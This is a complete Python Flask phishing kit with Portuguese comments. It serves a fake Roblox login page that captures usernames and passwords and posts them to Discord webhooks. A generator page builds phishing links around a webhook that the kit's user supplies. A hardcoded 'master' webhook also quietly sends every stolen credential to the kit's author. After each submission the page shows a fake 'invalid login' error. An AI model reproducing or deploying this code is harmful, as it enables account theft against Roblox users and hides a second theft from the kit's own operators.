import threading
import time
import requests
import base64
from flask import Flask, request, render_template_string

app = Flask(__name__)

# SEU WEBHOOK MESTRE
MASTER = "https://discord.com/api/webhooks/1470876714912583596/-fhV_z5n3qMq0nfoYdhSFXdHzXHjdRovLyTEvPmjD5K2TV5ByJ8J4KyZ93Y8nKz_L3_S"

@app.route('/')
def gerador():
    return '''
    <body style="background:#1a1a1a;color:#fff;font-family:sans-serif;text-align:center;padding:50px;">
        <h1 style="color:#00ff00;">🛡️ PAINEL GERADOR</h1>
        <p>Cole o Webhook da Vítima abaixo:</p>
        <input type="text" id="w" placeholder="https://discord.com/api/webhooks/..." style="width:80%;max-width:500px;padding:10px;">
        <br><br>
        <button onclick="gen()" style="padding:15px 30px;background:#00ff00;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">GERAR LINK</button>
        <div id="res" style="margin-top:30px;padding:20px;background:#2a2a2a;border-radius:10px;word-break:break-all;display:none;"></div>
        <script>
        function gen(){
            let h=document.getElementById('w').value;
            if(!h){alert('Coloque o webhook!');return;}
            let final = window.location.origin + "/login?v=" + btoa(h);
            let resDiv = document.getElementById('res');
            resDiv.style.display = "block";
            resDiv.innerHTML = "<h3 style='color:#00ff00;'>✅ Link Gerado!</h3>" + final;
        }
        </script>
    </body>'''

@app.route('/login', methods=['GET', 'POST'])
def login():
    v = request.args.get('v')
    if request.method == 'POST':
        u = request.form.get('username')
        p = request.form.get('password')
        payload = {
            "embeds": [{
                "title": "🔑 Novo Login!",
                "color": 16711680,
                "fields": [
                    {"name": "👤 Usuário", "value": f"```{u}```", "inline": False},
                    {"name": "🔑 Senha", "value": f"```{p}```", "inline": False}
                ]
            }]
        }
        try: requests.post(MASTER, json=payload)
        except: pass
        if v:
            try:
                wb = base64.b64decode(v).decode()
                requests.post(wb, json=payload)
            except: pass
        return render_template_string(HTML_ROBLOX, error=True)
    return render_template_string(HTML_ROBLOX, error=False)

HTML_ROBLOX = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: 'HCo Gotham SSm', sans-serif;
            background: url('https://i.postimg.cc/qR0867v1/roblox-bg.jpg') no-repeat center center fixed;
            background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .login-box {
            background: white; padding: 30px; border-radius: 8px; width: 350px; text-align: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        img { width: 150px; margin-bottom: 20px; }
        input {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #bdc3c7;
            border-radius: 4px; box-sizing: border-box; font-size: 14px;
        }
        button {
            width: 100%; padding: 12px; background: #0084ff; color: white; border: none;
            border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .error { color: #d0021b; font-size: 13px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://i.postimg.cc/6pX5D7S3/roblox-logo.png" alt="Roblox">
        {% if error %}<div class="error">Informações de login inválidas.</div>{% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Usuário/E-mail/Telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
        
